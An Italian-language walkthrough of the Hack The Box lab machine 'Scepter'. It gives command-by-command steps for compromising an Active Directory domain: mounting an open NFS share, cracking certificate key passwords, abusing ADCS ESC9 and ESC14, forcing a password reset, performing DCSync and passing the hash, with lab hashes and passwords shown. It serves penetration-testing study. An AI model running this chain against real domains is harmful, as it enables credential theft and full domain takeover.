---
title: 'HTB Scepter Walkthrough: NFS, ESC9, ESC14 e DCSync'
slug: htb-scepter-walkthrough
description: 'WriteUp completo a Hack The Box Scepter: NFS, certificati PFX/PEM, ADCS ESC9, ESC14, altSecurityIdentities e DCSync finale.'
image: /scepter-writeup-completo-hackthebox-htb.webp
draft: false
date: 2026-06-30T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - hackthebox
  - htb walktrough
  - htb writeup
---

# HTB Scepter — Walkthrough - WriteUp Completo Hack The Box(HTB)

**Difficoltà:** Hard\
**OS:** Windows / Active Directory\
**Tecniche principali:** NFS unauthenticated, PFX/PEM cracking, ESC9, ESC14, altSecurityIdentities, DCSync

***

## Recon

### Nmap

```bash
nmap -p- --min-rate 10000 10.10.11.65
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,5985,5986,9389 -sCV 10.10.11.65
```

Porte rilevanti:

* **53** — DNS
* **88** — Kerberos
* **111** — [RPC / portmapper](https://hackita.it/articoli/porta-111-rpcbind/)
* **389/636** — LDAP/LDAPS
* **445** — SMB
* **2049** — [NFS](https://hackita.it/articoli/porta-2049-nfs/) ← primo vettore da esplorare
* **5985/5986** — WinRM

La combinazione porta 111 (portmapper) + 2049 (NFS) è un segnale diretto: c'è uno share NFS esposto. Si enumera subito.

Il dominio `scepter.htb` e l'hostname `DC01` emergono dall'output LDAP. Aggiungiamo manualmente all'hosts:

```bash
sudo nano /etc/hosts
# aggiungere: 10.10.11.65  dc01.scepter.htb scepter.htb DC01
```

***

## NFS — TCP 2049

NFS (Network File System) è un protocollo che permette di montare filesystem remoti. Su un DC Windows è insolito trovarlo aperto — quando c'è, vale sempre la pena guardare cosa espone.

```bash
showmount -e dc01.scepter.htb
```

```
Export list for dc01.scepter.htb:
/helpdesk (everyone)
```

Accessibile a tutti, senza autenticazione. Lo montiamo:

```bash
sudo mount -t nfs dc01.scepter.htb:/helpdesk /mnt
ls -l /mnt/
```

```
baker.crt
baker.key
clark.pfx
lewis.pfx
scott.pfx
```

Certificati e chiavi private di quattro utenti. Copiamo tutto in locale:

```bash
cp /mnt/* .
sudo umount /mnt
```

***

## Analisi dei certificati

### baker.crt — dati in chiaro

```bash
openssl x509 -in baker.crt -noout -text
```

Il certificato espone l'identità dell'utente:

```
subject=CN=d.baker, emailAddress=d.baker@scepter.htb
issuer=CN=scepter-DC01-CA
```

`baker.key` è cifrata (PKCS#8 con password).

### clark / lewis / scott — PFX revocati

Proviamo a usarli direttamente con certipy:

```bash
certipy auth -pfx clark.pfx -dc-ip 10.10.11.65 -domain scepter.htb
```

Fallisce — i certificati di clark, lewis e scott sono stati revocati dalla CA. Inutilizzabili per autenticarsi.

Rimane `baker` — ha `.crt` e `.key` separati, non revocati.

***

## Cracking della chiave baker.key

`baker.key` è un PKCS#8 cifrato. Usiamo `pem2john` per estrarne l'hash:

```bash
pem2john.py baker.key > baker.hash
```

L'hash generato ha un prefisso extra (`$pbkdf2$sha256$aes256_cbc`) che va rimosso prima di passarlo a hashcat. Il formato corretto corrisponde alla modalità **24420** (PKCS#8 Private Keys, PBKDF2-HMAC-SHA256):

```bash
hashcat baker.hash rockyou.txt -m 24420
```

Password trovata: `newpassword`

Stesso risultato per i PFX degli altri tre (cracciabili con john ma inutili perché revocati):

```bash
pfx2john.py clark.pfx > pfx.hashes
pfx2john.py lewis.pfx >> pfx.hashes
pfx2john.py scott.pfx >> pfx.hashes
john pfx.hashes --wordlist=rockyou.txt
# newpassword per tutti e tre
```

***

## Auth come d.baker

Ora che abbiamo la password di `baker.key`, possiamo combinarla con `baker.crt` per creare un PFX utilizzabile:

```bash
openssl pkcs12 -inkey baker.key -in baker.crt -export -out baker.pfx
# inserire la password: newpassword
```

Usiamo certipy per autenticarci via PKINIT e ottenere il TGT + hash NT:

```bash
certipy auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username d.baker
```

Output:

```
[*] Got TGT
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

Verifica:

```bash
netexec smb dc01.scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
# [+] scepter.htb\d.baker
```

***

## Enumerazione AD — BloodHound

```bash
netexec ldap dc01.scepter.htb -u d.baker \
  -H 18b5fb0d99e7a475316213c15b6f22ce \
  --bloodhound -c All
```

BloodHound mostra che l'unico percorso verso Domain Admin passa per `p.adams`, che è membro di **Replication Operators** — il gruppo che permette di eseguire DCSync.

Guardiamo anche i gruppi di `h.brown` via query LDAP diretta:

```bash
netexec ldap 10.10.11.65 -u d.baker \
  -H 18b5fb0d99e7a475316213c15b6f22ce \
  --query "(sAMAccountName=h.brown)" ""
```

Output rilevante:

```
memberOf   CN=CMS,CN=Users,DC=scepter,DC=htb
           CN=Helpdesk Admins,CN=Users,DC=scepter,DC=htb
           CN=Protected Users,CN=Users,DC=scepter,DC=htb
           CN=Remote Management Users,CN=Builtin,DC=scepter,DC=htb
```

`h.brown` è in **Protected Users** — blocca l'autenticazione NTLM. Serve Kerberos. È anche in **Remote Management Users**, quindi con un TGT valido possiamo usare WinRM.

***

## Shell come h.brown — ESC9

### Teoria

Il template `StaffAccessCertificate` ha il flag `SubjectRequireEmail` e `SubjectAltRequireEmail`. Questo significa che nel certificato viene inclusa l'email dell'utente che richiede il cert. Se modifichiamo l'UPN di `d.baker` per farlo sembrare `h.brown`, il certificato richiesto conterrà l'identità di `h.brown`.

Questo è **ESC9**: abuso del flag `SubjectAltRequireEmail` combinato con la possibilità di modificare l'UPN di un utente terzo.

Per la teoria completa: [ESC9 — ADCS](https://hackita.it/articoli/esc9-adcs/)

### Catena di permessi

BloodHound mostra che:

* `d.baker` può cambiare la password di `a.carter`
* `a.carter` ha WriteProperty sull'OU `Staff Access Certificate`
* Dall'OU si può modificare l'attributo `userPrincipalName` di `d.baker`

### Exploit

Cambio password di a.carter:

```bash
pth-net rpc password "a.carter" "newPassword2022" \
  -U "scepter.htb"/"d.baker"%"aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce" \
  -S "dc01.scepter.htb"
```

FullControl ad a.carter sull'OU:

```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance \
  -principal 'a.carter' \
  -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' \
  'scepter.htb'/'a.carter':'newPassword2022'
```

UPN di d.baker → h.brown:

```bash
certipy-ad account update -u 'a.carter@scepter.htb' -p 'newPassword2022' \
  -user d.baker -upn 'h.brown' -dc-ip 10.10.11.65
```

Mail di d.baker:

```bash
bloodyAD --host 10.10.11.65 -d scepter.htb -u a.carter -p 'newPassword2022' \
  set object d.baker mail -v 'h.brown@scepter.htb'
```

Richiesta certificato:

```bash
certipy-ad req -u 'd.baker@scepter.htb' \
  -hashes ':18b5fb0d99e7a475316213c15b6f22ce' \
  -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' \
  -dc-ip 10.10.11.65 -target-ip 10.10.11.65
```

Ripristino UPN (fondamentale — se non lo fai il DC va in conflitto):

```bash
certipy-ad account update -u 'a.carter@scepter.htb' -p 'newPassword2022' \
  -user d.baker -upn 'd.baker' -dc-ip 10.10.11.65
```

Auth come h.brown:

```bash
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 \
  -ns 10.10.11.65 -domain scepter.htb -username h.brown
```

TGT + hash NT di `h.brown`. `h.brown` è in **Protected Users** — NTLM bloccato, PTH non funziona. Serve Kerberos.

Esportiamo la ccache e usiamo evil-winrm con autenticazione Kerberos:

```bash
export KRB5CCNAME=h.brown.ccache
evil-winrm -i SCEPTER.HTB -r DC01.SCEPTER.HTB
```

Una volta dentro, l'enumerazione del filesystem non porta a nulla di utile. Il vettore successivo torna sui certificati, non sul sistema locale. Flag user nella home di h.brown.

***

## Privilege Escalation — ESC14 (altSecurityIdentities)

### Enumerazione con bloodyAD

BloodHound non mostra path utili da `h.brown`. Usiamo `bloodyAD get writable --detail` — più granulare di BloodHound perché interroga direttamente LDAP e mostra i singoli attributi scrivibili:

```bash
KRB5CCNAME=h.brown.ccache bloodyAD --host dc01.scepter.htb \
  -d scepter.htb -k get writable --detail
```

Nel risultato:

```
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE
```

`h.brown` può scrivere `altSecurityIdentities` su `p.adams`.

Verifichiamo lo stato attuale di `p.adams`:

```bash
netexec ldap 10.10.11.65 -u d.baker \
  -H 18b5fb0d99e7a475316213c15b6f22ce \
  --query "(sAMAccountName=p.adams)" ""
```

`altSecurityIdentities` è vuoto. Perfetto — possiamo scrivere quello che vogliamo.

### Cos'è altSecurityIdentities

`altSecurityIdentities` è un attributo AD che permette di mappare identità esterne su un utente per l'autenticazione. In pratica dice al DC: "se qualcuno si presenta con questa identità, trattalo come questo utente."

Supporta diversi formati:

| Formato          | Esempio                        |
| ---------------- | ------------------------------ |
| Email (RFC822)   | `X509:<RFC822>utente@dominio`  |
| Subject DN       | `X509:<S>CN=utente,DC=dominio` |
| Issuer+Subject   | `X509:<I>CN=CA<S>CN=utente`    |
| Thumbprint (SKI) | `X509:<SKI>abc123...`          |

In questo caso usiamo il formato **RFC822** (email), perché è quello che includiamo nel certificato tramite l'attributo `mail` di `d.baker`.

Questo è **ESC14**: write su `altSecurityIdentities` + controllo su un utente che può richiedere certificati = impersonazione.

Per la spiegazione dettagliata: [ADCS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)

### Exploit

Scriviamo il mapping su p.adams:

```bash
KRB5CCNAME=h.brown.ccache bloodyAD --host dc01.scepter.htb \
  -d scepter.htb -k set object p.adams altSecurityIdentities \
  -v 'X509:<RFC822>p.adams@scepter.htb'
```

Reimpostiamo a.carter (se il cleanup della macchina ha resettato le modifiche precedenti):

```bash
pth-net rpc password "a.carter" "newPassword2022" \
  -U "scepter.htb"/"d.baker"%"aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce" \
  -S "dc01.scepter.htb"

dacledit.py -action 'write' -rights 'FullControl' -inheritance \
  -principal 'a.carter' \
  -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' \
  'scepter.htb'/'a.carter':'newPassword2022'
```

UPN di d.baker → p.adams:

```bash
certipy-ad account update -u 'a.carter@scepter.htb' -p 'newPassword2022' \
  -user d.baker -upn 'p.adams' -dc-ip 10.10.11.65
```

Verifica che l'UPN sia stato aggiornato:

```bash
ldapsearch -H ldap://10.10.11.65 \
  -D 'CN=a.carter,CN=Users,DC=scepter,DC=htb' -w newPassword2022 \
  -b 'DC=scepter,DC=htb' '(sAMAccountName=d.baker)' userPrincipalName
```

Mail di d.baker = stesso valore scritto in altSecurityIdentities (devono corrispondere):

```bash
bloodyAD --host 10.10.11.65 -d scepter.htb -u a.carter -p 'newPassword2022' \
  set object d.baker mail -v 'p.adams@scepter.htb'
```

Richiesta certificato:

```bash
certipy-ad req -u 'd.baker@scepter.htb' \
  -hashes ':18b5fb0d99e7a475316213c15b6f22ce' \
  -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' \
  -dc-ip 10.10.11.65 -target-ip 10.10.11.65
```

Ripristino UPN:

```bash
certipy-ad account update -u 'a.carter@scepter.htb' -p 'newPassword2022' \
  -user d.baker -upn 'd.baker' -dc-ip 10.10.11.65
```

Auth come p.adams:

```bash
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 \
  -ns 10.10.11.65 -domain scepter.htb -username p.adams
```

```
[*] Got TGT
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

Il funzionamento: la mail del certificato (`p.adams@scepter.htb`) corrisponde al valore scritto in `altSecurityIdentities` → il DC fa il mapping → autentica come `p.adams`.

***

## DCSync → Domain Compromise

`p.adams` è in **Replication Operators** — può eseguire DCSync, cioè richiedere al DC tutti gli hash come se fosse un domain controller secondario.

```bash
secretsdump.py -just-dc-ntlm 'scepter.htb'/'p.adams' \
  -hashes ':1b925c524f447bb821a8789c4b118ce0' \
  @dc01.scepter.htb
```

Hash Administrator → PTH:

```bash
evil-winrm -i dc01.scepter.htb -u Administrator -H <hash>
```

Flag root.

***

## Risorse

* [ADCS ESC1–ESC16 — Guida Completa](https://hackita.it/articoli/adcs-esc1-esc16/)
* [ESC9 — ADCS](https://hackita.it/articoli/esc9-adcs/)
* [DCSync](https://hackita.it/articoli/dcsync/#metodo-2-secretsdumppy-da-linux--impacket)
* [RPC / Portmapper — Porta 111](https://hackita.it/articoli/porta-111-rpcbind/)
* [NFS — Porta 2049](https://hackita.it/articoli/porta-2049-nfs/)
* [LDAP — Porta 389](https://hackita.it/articoli/porta-389-ldap/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
